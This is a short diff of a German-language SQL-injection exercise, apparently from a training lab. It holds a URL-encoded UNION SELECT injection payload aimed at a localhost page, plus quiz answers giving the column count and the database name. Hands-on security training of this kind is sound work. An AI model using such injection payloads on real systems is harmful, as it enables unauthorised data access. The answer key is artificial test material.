@@ -6,7 +6,7 @@ Encodieren Sie Ihr Injection-Statement dazu im URL-Format und kopieren Sie es in
 http://localhost:82/index.php?id=2%27%20AND%201%3D0%20UNION%20SELECT%200%2C0%2C0%2C0%2C0%2Cdatabase()%2C0%3B--%20
 
 >>9) Wie viele Spalten enthält die Tabelle insgesamt?<<
-     === 7
+=== 7
 
 >>10) Wie lautet der Name der Datenbank?<<
-     === highlight_db
+=== highlight_db
